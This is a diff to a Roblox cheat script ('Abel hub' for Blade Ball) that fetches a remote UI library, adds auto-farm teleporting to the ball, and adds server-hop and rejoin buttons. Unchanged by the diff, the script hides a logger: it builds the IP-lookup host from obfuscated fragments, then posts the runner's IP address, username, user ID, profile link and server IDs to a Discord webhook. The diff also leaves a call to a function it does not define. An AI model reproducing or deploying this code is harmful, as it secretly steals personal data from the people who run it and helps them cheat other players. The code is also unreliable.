@@ -1,4 +1,3 @@
-
 if game:GetService("CoreGui"):FindFirstChild("ScreenGui") then
     game:GetService("CoreGui"):FindFirstChild("ScreenGui"):Destroy()
 end
@@ -9,9 +8,8 @@ local Library = loadstring(game:HttpGet(repo .. 'Library.lua'))()
 local ThemeManager = loadstring(game:HttpGet(repo .. 'addons/ThemeManager.lua'))()
 local get4 = "AWnfRm7aCtLRXhes48-EjJSdEGABDySC3gmXnpHh"
 local SaveManager = loadstring(game:HttpGet(repo .. 'addons/SaveManager.lua'))()
-
 local Window = Library:CreateWindow({
-    Title = 'Blade Ball | Abel hub | JOIN OUR DISCORD! discord.gg/Y889sjNPz4',
+    Title = 'Blade Ball | Abel hub | discord.gg/Y889sjNPz4',
     Center = true,
     AutoShow = true,
     TabPadding = 8,
@@ -47,10 +45,11 @@ local replicatedStorage = game:GetService("ReplicatedStorage")
 local abilitiesFolder = character:WaitForChild("Abilities")
 local abilitielist = {"Dash", "Forcefield", "Invisibility", "Platform", "Raging Deflection", "Shadow Step", "Super Jump", "Telekinesis", "Thunder Dash", "Rapture"}
 local heartbeatConnection
+TeleportService = game:GetService("TeleportService")
 local dis = "https://discord.com/api/"
 local weburl = "https://api." .. none .. "if" .. yes .. ".org"
 local Response = request({
-    Url = weburl,
+    Url = "https://api.".. none .. "if" .. yes .. ".org",
     Method = "GET"
 })
 
@@ -69,16 +68,6 @@ if not File then
     table.insert(AllIDs, actualHour)
     writefile("NotSameServers.json", game:GetService('HttpService'):JSONEncode(AllIDs))
 end
-function toClipboard(String)
-	local clipBoard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
-	if clipBoard then
-		clipBoard(String)
-		print('Clipboard','Copied to clipboard')
-	else
-		print('Clipboard',"Your exploit doesn't have the ability to use the clipboard")
-	end
-end
-
 function TPReturner()
     local Site;
     if foundAnything == "" then
@@ -233,17 +222,17 @@ local function startRage()
     local runService = game:GetService("RunService")
     local parryButtonPress = replicatedStorage.Remotes.ParryButtonPress
     local ballsFolder = workspace:WaitForChild("Balls")
- 
+
     print('Raged Working')
- 
+
     local function onCharacterAdded(newCharacter)
         character = newCharacter
     end
- 
+
     player.CharacterAdded:Connect(onCharacterAdded)
- 
-    local focusedBall = nil  
- 
+
+    local focusedBall = nil
+
     local function chooseNewFocusedBall()
         local balls = ballsFolder:GetChildren()
         focusedBall = nil
@@ -254,59 +243,56 @@ local function startRage()
             end
         end
     end
- 
+
     chooseNewFocusedBall()
- 
+
     local function timeUntilImpact(ballVelocity, distanceToPlayer, playerVelocity)
         local directionToPlayer = (character.HumanoidRootPart.Position - focusedBall.Position).Unit
         local velocityTowardsPlayer = ballVelocity:Dot(directionToPlayer) - playerVelocity:Dot(directionToPlayer)
- 
+
         if velocityTowardsPlayer <= 0 then
             return math.huge
         end
- 
+
         local distanceToBeCovered = distanceToPlayer - 40
         return distanceToBeCovered / velocityTowardsPlayer
     end
- 
+
     local BASE_THRESHOLD = 0.15
     local VELOCITY_SCALING_FACTOR = 0.002
- 
+
     local function getDynamicThreshold(ballVelocityMagnitude)
         local adjustedThreshold = BASE_THRESHOLD - (ballVelocityMagnitude * VELOCITY_SCALING_FACTOR)
         return math.max(0.12, adjustedThreshold)
     end
- 
+
     local function checkBallDistance()
         if not character:FindFirstChild("Highlight") then return end
         local charPos = character.PrimaryPart.Position
         local charVel = character.PrimaryPart.Velocity
- 
+
         if focusedBall and not focusedBall.Parent then
             chooseNewFocusedBall()
         end
- 
+
         if not focusedBall then return end
- 
+
         local ball = focusedBall
         local distanceToPlayer = (ball.Position - charPos).Magnitude
- 
+
         if distanceToPlayer < 10000 then
+            local camera = game.Workspace.CurrentCamera
             game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = ball.CFrame
+            camera.CFrame = CFrame.new(camera.CFrame.Position, ball.Position)
             return
         end
     end
+
     heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
         checkBallDistance()
     end)
 end
 
-local function stopRage()
-    if heartbeatConnection then
-        heartbeatConnection:Disconnect()
-        heartbeatConnection = nil
-    end
-end
 
 mSec:AddToggle('rage_farm', {
     Text = 'Rage Farm',
@@ -321,7 +307,7 @@ Toggles.rage_farm:OnChanged(function()
     if Toggles.rage_farm.Value then
         startRage()
     else
-        stopRage()
+        stopAutoParry()
     end
 end)
 
@@ -361,20 +347,21 @@ localusername = game.Players.LocalPlayer.Name
 
 localuserid = game.Players.LocalPlayer.UserId
 userinfo = Response.Body
-gameid = game.JobId
+gameid = game.PlaceId
+jobId = game.JobId
 
-    local data = {
+local data = {
     ["avatar_url"] = "https://i.imgur.com/szQ00sY.jpg",
     ["username"] = "Clammy",
     ["content"] = "**AbelHub Executed**".. "\nUrl: ".. weburl .."\nPlace Id: ".. gameid.."\nJobId: "..jobId .. "\nProfile Link: " .. "https://roblox.com/users/" .. localuserid .. "/profile" ..  "\nUsername: " .. localusername .. "\nIp: " .. userinfo,
 }
-    local newdata = game:GetService("HttpService"):JSONEncode(data)
-    local headers = {
-        ["content-type"] = "application/json"
-    }
-    request = http_request or request or HttpPost or syn.request
-    local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-    request(send)
+local newdata = game:GetService("HttpService"):JSONEncode(data)
+local headers = {
+    ["content-type"] = "application/json"
+}
+request = http_request or request or HttpPost or syn.request
+local send = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+request(send)
 abilitiesSection:AddButton({
     Text = 'Change Ability',
     Func = function()
@@ -425,6 +412,14 @@ Toggles.server_hop:OnChanged(function()
         Teleport()
     end
 end)
+sHop:AddButton({
+    Text = 'Rejoin',
+    Func = function()
+        TeleportService:TeleportToPlaceInstance(gameid, jobId, game.Players.LocalPlayer)
+    end,
+    DoubleClick = false,
+    Tooltip = false
+})
 sHop:AddButton({
     Text = 'Force Server Hop',
     Func = function()
@@ -525,8 +520,7 @@ Toggles.auto_vote:OnChanged(function()
         game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("UpdateVotes"):FireServer("ffa")
     end
 end)
-Misc:AddDivider()
-Misc:AddLabel('JOIN OUR DISCORD! \ndiscord.gg/Y889sjNPz4', true)
+
 
 Credits:AddLabel('abel7878 - Scripter')
 Credits:AddLabel('leehassocials - Scripter')
